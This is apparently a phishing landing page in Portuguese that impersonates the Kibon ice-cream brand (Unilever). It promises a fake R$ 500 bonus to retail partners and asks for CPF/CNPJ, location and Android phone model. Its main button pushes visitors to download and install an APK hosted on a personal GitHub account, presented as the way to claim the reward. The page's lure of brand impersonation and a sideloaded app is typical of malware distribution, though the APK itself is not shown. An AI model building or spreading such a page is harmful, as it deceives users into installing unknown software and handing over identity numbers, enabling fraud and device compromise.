<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kibon - Resgate seu Bônus de Freezer</title>
    <style>
        :root {
            --vermelho-kibon: #e31b23;
            --amarelo-kibon: #ffcc00;
            --cinza-fundo: #f4f4f4;
        }

        body { 
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: var(--cinza-fundo); 
        }

        header {
            background-color: white;
            padding: 20px 0;
            text-align: center;
            border-bottom: 5px solid var(--vermelho-kibon);
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        .logo-kibon {
            font-weight: 900;
            font-size: 2.8em;
            color: var(--vermelho-kibon);
            font-style: italic;
            letter-spacing: -2px;
            text-transform: uppercase;
        }

        .container { 
            max-width: 450px; 
            margin: 40px auto; 
            background: #fff; 
            padding: 30px; 
            border-radius: 25px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
        }

        .bonus-card { 
            background: var(--vermelho-kibon); 
            color: white; 
            padding: 20px; 
            text-align: center; 
            border-radius: 20px; 
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
        }

        .bonus-card h2 { margin: 0; font-size: 1.5em; text-transform: uppercase; }
        .bonus-card p { margin: 5px 0 0; font-weight: bold; color: var(--amarelo-kibon); }

        .form-group { margin-bottom: 18px; }
        
        label { 
            display: block; 
            font-weight: bold; 
            margin-bottom: 6px;
            color: #444;
            font-size: 0.9em;
        }

        input, select { 
            width: 100%; 
            padding: 14px; 
            border: 2px solid #f0f0f0; 
            border-radius: 12px; 
            box-sizing: border-box; 
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
        }

        input:focus, select:focus {
            border-color: var(--vermelho-kibon);
            background-color: #fffcfc;
        }

        .error-msg { 
            color: var(--vermelho-kibon); 
            font-size: 0.8em; 
            font-weight: bold;
            display: none; 
            margin-top: 5px;
        }

        .btn-download { 
            display: block; 
            width: 100%; 
            background: var(--vermelho-kibon); 
            color: white; 
            text-align: center; 
            padding: 20px; 
            text-decoration: none; 
            border-radius: 50px; 
            font-weight: bold; 
            font-size: 1.2em;
            margin-top: 25px; 
            box-shadow: 0 6px 20px rgba(227, 27, 35, 0.4);
            transition: transform 0.2s, background 0.3s;
        }

        .btn-download:hover {
            background: #ff1e26;
            transform: translateY(-2px);
        }

        footer {
            text-align: center;
            padding: 30px;
            font-size: 0.75em;
            color: #bbb;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

<header>
    <div class="logo-kibon">Kibon</div>
</header>

<div class="container">
    <div class="bonus-card">
        <h2>Bônus de R$ 500,00</h2>
        <p>EXCLUSIVO PARA PARCEIROS</p>
    </div>

    <form id="cadastroForm">
        <div class="form-group">
            <label>PERFIL PROFISSIONAL</label>
            <select required>
                <option value="">Selecione seu perfil...</option>
                <option>Ponto de Venda (PDV)</option>
                <option>Revendedor Autônomo</option>
                <option>Distribuição</option>
            </select>
        </div>

        <div class="form-group">
            <label>CPF OU CNPJ (APENAS NÚMEROS)</label>
            <input type="text" id="documento" maxlength="18" placeholder="Digite aqui..." required>
            <span id="docErro" class="error-msg">⚠️ Documento inválido ou incompleto.</span>
        </div>

        <div class="form-group" style="display: flex; gap: 10px;">
            <div style="flex: 1;">
                <label>ESTADO</label>
                <select id="estado" required>
                    <option value="">UF</option>
                    <option>SP</option><option>RJ</option><option>MG</option>
                    <option>RS</option><option>BA</option><option>PR</option>
                </select>
            </div>
            <div style="flex: 2;">
                <label>CIDADE</label>
                <select id="cidade" required>
                    <option value="">Selecione...</option>
                    <option>São Paulo</option>
                    <option>Rio de Janeiro</option>
                    <option>Belo Horizonte</option>
                </select>
            </div>
        </div>

        <div class="form-group">
            <label>MODELO DO SEU ANDROID</label>
            <select required>
                <option value="">Selecione o aparelho...</option>
                <optgroup label="SAMSUNG">
                    <option>Linha Galaxy S (S20, S21, S22, S23, S24)</option>
                    <option>Linha Galaxy A / M</option>
                </optgroup>
                <optgroup label="MOTOROLA">
                    <option>Moto G / Edge / One</option>
                </optgroup>
                <optgroup label="OUTROS">
                    <option>Xiaomi / Redmi / POCO</option>
                    <option>Realme / Asus / Outros</option>
                </optgroup>
            </select>
        </div>

        <!-- SEU LINK DO GITHUB APLICADO ABAIXO -->
        <a href="https://github.com/wellsilvasp13-hash/kibon/raw/main/kibon.apk" class="btn-download">
            BAIXAR APK E RESGATAR
        </a>
    </form>
</div>

<footer>
    &copy; 2026 Kibon Brasil - Unilever. Todos os direitos reservados.
</footer>

<script>
    // Validação básica de campo para simular erro se for muito curto
    document.getElementById('documento').addEventListener('blur', function() {
        const doc = this.value.replace(/\D/g, '');
        const erro = document.getElementById('docErro');
        
        if (doc.length !== 11 && doc.length !== 14) {
            erro.style.display = 'block';
            this.style.borderColor = '#e31b23';
        } else {
            erro.style.display = 'none';
            this.style.borderColor = '#f0f0f0';
        }
    });
</script>

</body>
</html>
